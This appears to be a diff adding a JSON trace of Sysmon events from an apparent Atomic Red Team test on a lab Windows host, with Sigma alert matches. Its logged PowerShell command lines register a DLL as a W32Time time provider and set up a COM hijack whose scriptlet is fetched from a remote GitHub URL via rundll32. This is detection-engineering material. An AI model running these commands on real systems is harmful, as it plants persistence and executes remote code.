@@ -1,0 +1,2675 @@
+﻿{
+    "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+    "spans":  [
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "d5adb871aa6fa300",
+                      "operationName":  "net.exe@evt:1",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "2b759ee4b84eadaf"
+                                         }
+                                     ],
+                      "startTime":  1758793508450603,
+                      "duration":  3908,
+                      "tags":  [
+                                   {
+                                       "key":  "CommandLine",
+                                       "type":  "string",
+                                       "value":  "\"C:\\Windows\\system32\\net.exe\" stop w32time"
+                                   },
+                                   {
+                                       "key":  "Company",
+                                       "type":  "string",
+                                       "value":  "Microsoft Corporation"
+                                   },
+                                   {
+                                       "key":  "CurrentDirectory",
+                                       "type":  "string",
+                                       "value":  "C:\\Users\\Administrator\\AppData\\Local\\Temp\\"
+                                   },
+                                   {
+                                       "key":  "Description",
+                                       "type":  "string",
+                                       "value":  "Net Command"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "ProcessCreate(rule:ProcessCreate)"
+                                   },
+                                   {
+                                       "key":  "FileVersion",
+                                       "type":  "string",
+                                       "value":  "10.0.20348.1 (WinBuild.160101.0800)"
+                                   },
+                                   {
+                                       "key":  "Hashes",
+                                       "type":  "string",
+                                       "value":  "MD5=540D7FDC6B3C5B66F66188506A4E1D12,SHA256=F540747022E0D67722989765B5DB268707E4E71538AE0764110EEC7B8D9AEEF6,IMPHASH=D45C37A5C97135204AD6E116C34946C3"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net.exe"
+                                   },
+                                   {
+                                       "key":  "IntegrityLevel",
+                                       "type":  "string",
+                                       "value":  "High"
+                                   },
+                                   {
+                                       "key":  "LogonGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0d7d-68d5-0f8e-070000000000"
+                                   },
+                                   {
+                                       "key":  "LogonId",
+                                       "type":  "int64",
+                                       "value":  495119
+                                   },
+                                   {
+                                       "key":  "OriginalFileName",
+                                       "type":  "string",
+                                       "value":  "net.exe"
+                                   },
+                                   {
+                                       "key":  "ParentCommandLine",
+                                       "type":  "string",
+                                       "value":  "\"powershell.exe\" \u0026 {net stop w32time\nCopy-Item \\\"\"C:\\AtomicRedTeam\\atomics\\T1547.003\\bin\\AtomicTest.dll\\\"\" C:\\Users\\Public\\AtomicTest.dll\nreg add \\\"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\\\"\" /t REG_SZ /v \\\"\"DllName\\\"\" /d \\\"\"C:\\Users\\Public\\AtomicTest.dll\\\"\" /f\nreg add \\\"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\\\"\" /t REG_DWORD /v \\\"\"Enabled\\\"\" /d \\\"\"1\\\"\" /f\nreg add \\\"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\\\"\" /t REG_DWORD /v \\\"\"InputProvider\\\"\" /d \\\"\"1\\\"\" /f\nnet start w32time}"
+                                   },
+                                   {
+                                       "key":  "ParentImage",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                                   },
+                                   {
+                                       "key":  "ParentProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f22-68d5-0602-000000000300"
+                                   },
+                                   {
+                                       "key":  "ParentProcessId",
+                                       "type":  "int64",
+                                       "value":  2984
+                                   },
+                                   {
+                                       "key":  "ParentUser",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1302-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Product",
+                                       "type":  "string",
+                                       "value":  "MicrosoftÂ® WindowsÂ® Operating System"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TerminalSessionId",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:07"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:07.590"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "error",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "otel.status_code",
+                                       "type":  "string",
+                                       "value":  "ERROR"
+                                   },
+                                   {
+                                       "key":  "otel.status_description",
+                                       "type":  "string",
+                                       "value":  "Sigma rules matched: 2"
+                                   },
+                                   {
+                                       "key":  "sigma.alert",
+                                       "type":  "string",
+                                       "value":  "[\"88872991-7445-4a22-90b2-a3adadb0e827\",\"b243b280-65fe-48df-ba07-6ddea7646427\"]"
+                                   },
+                                   {
+                                       "key":  "sigma.match_count",
+                                       "type":  "int64",
+                                       "value":  2
+                                   },
+                                   {
+                                       "key":  "sigma.rule_title",
+                                       "type":  "string",
+                                       "value":  "[\"Stop Windows Service Via Net.EXE\",\"Discovery of a System Time\"]"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  2984
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=2b759ee4b84eadaf; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "846ae38b4f8c2c23",
+                      "operationName":  "rundll32.exe@evt:3",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "ef74c6a5d0a4faca"
+                                         }
+                                     ],
+                      "startTime":  1758793516531298,
+                      "duration":  280,
+                      "tags":  [
+                                   {
+                                       "key":  "DestinationHostname",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "DestinationIp",
+                                       "type":  "string",
+                                       "value":  "172.64.149.23"
+                                   },
+                                   {
+                                       "key":  "DestinationIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "DestinationPort",
+                                       "type":  "int64",
+                                       "value":  80
+                                   },
+                                   {
+                                       "key":  "DestinationPortName",
+                                       "type":  "string",
+                                       "value":  "http"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Networkconnectiondetected(rule:NetworkConnect)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  3
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "Initiated",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Protocol",
+                                       "type":  "string",
+                                       "value":  "tcp"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "SourceHostname",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05.localdomain"
+                                   },
+                                   {
+                                       "key":  "SourceIp",
+                                       "type":  "string",
+                                       "value":  "192.168.238.136"
+                                   },
+                                   {
+                                       "key":  "SourceIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "SourcePort",
+                                       "type":  "int64",
+                                       "value":  -15629
+                                   },
+                                   {
+                                       "key":  "SourcePortName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:15"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:14.544"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=ef74c6a5d0a4faca; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "d5adb871aa6fa300",
+                      "operationName":  "net.exe@evt:1",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "5e0b63fe659a0f04"
+                                         }
+                                     ],
+                      "startTime":  1758793508450603,
+                      "duration":  3908,
+                      "tags":  [
+                                   {
+                                       "key":  "CommandLine",
+                                       "type":  "string",
+                                       "value":  "\"C:\\Windows\\system32\\net.exe\" stop w32time"
+                                   },
+                                   {
+                                       "key":  "Company",
+                                       "type":  "string",
+                                       "value":  "Microsoft Corporation"
+                                   },
+                                   {
+                                       "key":  "CurrentDirectory",
+                                       "type":  "string",
+                                       "value":  "C:\\Users\\Administrator\\AppData\\Local\\Temp\\"
+                                   },
+                                   {
+                                       "key":  "Description",
+                                       "type":  "string",
+                                       "value":  "Net Command"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "ProcessCreate(rule:ProcessCreate)"
+                                   },
+                                   {
+                                       "key":  "FileVersion",
+                                       "type":  "string",
+                                       "value":  "10.0.20348.1 (WinBuild.160101.0800)"
+                                   },
+                                   {
+                                       "key":  "Hashes",
+                                       "type":  "string",
+                                       "value":  "MD5=540D7FDC6B3C5B66F66188506A4E1D12,SHA256=F540747022E0D67722989765B5DB268707E4E71538AE0764110EEC7B8D9AEEF6,IMPHASH=D45C37A5C97135204AD6E116C34946C3"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net.exe"
+                                   },
+                                   {
+                                       "key":  "IntegrityLevel",
+                                       "type":  "string",
+                                       "value":  "High"
+                                   },
+                                   {
+                                       "key":  "LogonGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0d7d-68d5-0f8e-070000000000"
+                                   },
+                                   {
+                                       "key":  "LogonId",
+                                       "type":  "int64",
+                                       "value":  495119
+                                   },
+                                   {
+                                       "key":  "OriginalFileName",
+                                       "type":  "string",
+                                       "value":  "net.exe"
+                                   },
+                                   {
+                                       "key":  "ParentCommandLine",
+                                       "type":  "string",
+                                       "value":  "\"powershell.exe\" \u0026 {net stop w32time\nCopy-Item \\\"\"C:\\AtomicRedTeam\\atomics\\T1547.003\\bin\\AtomicTest.dll\\\"\" C:\\Users\\Public\\AtomicTest.dll\nreg add \\\"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\\\"\" /t REG_SZ /v \\\"\"DllName\\\"\" /d \\\"\"C:\\Users\\Public\\AtomicTest.dll\\\"\" /f\nreg add \\\"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\\\"\" /t REG_DWORD /v \\\"\"Enabled\\\"\" /d \\\"\"1\\\"\" /f\nreg add \\\"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\\\"\" /t REG_DWORD /v \\\"\"InputProvider\\\"\" /d \\\"\"1\\\"\" /f\nnet start w32time}"
+                                   },
+                                   {
+                                       "key":  "ParentImage",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                                   },
+                                   {
+                                       "key":  "ParentProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f22-68d5-0602-000000000300"
+                                   },
+                                   {
+                                       "key":  "ParentProcessId",
+                                       "type":  "int64",
+                                       "value":  2984
+                                   },
+                                   {
+                                       "key":  "ParentUser",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1302-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Product",
+                                       "type":  "string",
+                                       "value":  "MicrosoftÂ® WindowsÂ® Operating System"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TerminalSessionId",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:07"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:07.590"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "error",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "otel.status_code",
+                                       "type":  "string",
+                                       "value":  "ERROR"
+                                   },
+                                   {
+                                       "key":  "otel.status_description",
+                                       "type":  "string",
+                                       "value":  "Sigma rules matched: 2"
+                                   },
+                                   {
+                                       "key":  "sigma.alert",
+                                       "type":  "string",
+                                       "value":  "[\"88872991-7445-4a22-90b2-a3adadb0e827\",\"b243b280-65fe-48df-ba07-6ddea7646427\"]"
+                                   },
+                                   {
+                                       "key":  "sigma.match_count",
+                                       "type":  "int64",
+                                       "value":  2
+                                   },
+                                   {
+                                       "key":  "sigma.rule_title",
+                                       "type":  "string",
+                                       "value":  "[\"Stop Windows Service Via Net.EXE\",\"Discovery of a System Time\"]"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  2984
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "duplicate span IDs; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "18b33001c664f650",
+                      "operationName":  "rundll32.exe@evt:1",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "b8865304f54b6e48"
+                                         }
+                                     ],
+                      "startTime":  1758793513939385,
+                      "duration":  21289,
+                      "tags":  [
+                                   {
+                                       "key":  "CommandLine",
+                                       "type":  "string",
+                                       "value":  "\"C:\\Windows\\system32\\rundll32.exe\" -sta AtomicTest"
+                                   },
+                                   {
+                                       "key":  "Company",
+                                       "type":  "string",
+                                       "value":  "Microsoft Corporation"
+                                   },
+                                   {
+                                       "key":  "CurrentDirectory",
+                                       "type":  "string",
+                                       "value":  "C:\\Users\\Administrator\\AppData\\Local\\Temp\\"
+                                   },
+                                   {
+                                       "key":  "Description",
+                                       "type":  "string",
+                                       "value":  "Windows host process (Rundll32)"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "ProcessCreate(rule:ProcessCreate)"
+                                   },
+                                   {
+                                       "key":  "FileVersion",
+                                       "type":  "string",
+                                       "value":  "10.0.20348.1 (WinBuild.160101.0800)"
+                                   },
+                                   {
+                                       "key":  "Hashes",
+                                       "type":  "string",
+                                       "value":  "MD5=F5B2D37BED0D2B15957736C23B9F547F,SHA256=0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "IntegrityLevel",
+                                       "type":  "string",
+                                       "value":  "High"
+                                   },
+                                   {
+                                       "key":  "LogonGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0d7d-68d5-0f8e-070000000000"
+                                   },
+                                   {
+                                       "key":  "LogonId",
+                                       "type":  "int64",
+                                       "value":  495119
+                                   },
+                                   {
+                                       "key":  "OriginalFileName",
+                                       "type":  "string",
+                                       "value":  "RUNDLL32.EXE"
+                                   },
+                                   {
+                                       "key":  "ParentCommandLine",
+                                       "type":  "string",
+                                       "value":  "\"powershell.exe\" \u0026 {reg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\\\"\" /ve /T REG_SZ /d \\\"\"{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\\\"\" /ve /T REG_SZ /d \\\"\"{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\\\"\" /ve /T REG_SZ /d \\\"\"C:\\WINDOWS\\system32\\scrobj.dll\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\\\"\" /v \\\"\"ThreadingModel\\\"\" /T REG_SZ /d \\\"\"Apartment\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\\\"\" /ve /T REG_SZ /d \\\"\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\n\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\\\"\" /ve /T REG_SZ /d \\\"\"{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\n\nrundll32.exe -sta \\\"\"AtomicTest\\\"\"}"
+                                   },
+                                   {
+                                       "key":  "ParentImage",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                                   },
+                                   {
+                                       "key":  "ParentProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f27-68d5-2f02-000000000300"
+                                   },
+                                   {
+                                       "key":  "ParentProcessId",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "ParentUser",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Product",
+                                       "type":  "string",
+                                       "value":  "MicrosoftÂ® WindowsÂ® Operating System"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TerminalSessionId",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:13"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:13.334"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=b8865304f54b6e48; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "4ddafa7151e49b34",
+                      "operationName":  "rundll32.exe@evt:22",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "b8865304f54b6e48"
+                                         }
+                                     ],
+                      "startTime":  1758793515501528,
+                      "duration":  387,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Dnsquery(rule:DnsQuery)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  22
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "QueryName",
+                                       "type":  "string",
+                                       "value":  "raw.githubusercontent.com"
+                                   },
+                                   {
+                                       "key":  "QueryResults",
+                                       "type":  "string",
+                                       "value":  "::ffff:185.199.108.133;::ffff:185.199.110.133;::ffff:185.199.109.133;::ffff:185.199.111.133;"
+                                   },
+                                   {
+                                       "key":  "QueryStatus",
+                                       "type":  "string",
+                                       "value":  "0"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:14.162"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=b8865304f54b6e48; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "f046f7400f02ec46",
+                      "operationName":  "rundll32.exe@evt:5",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "c0bf6195a65a0fd0"
+                                         }
+                                     ],
+                      "startTime":  1758793515565514,
+                      "duration":  3042,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Processterminated(rule:ProcessTerminate)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  5
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
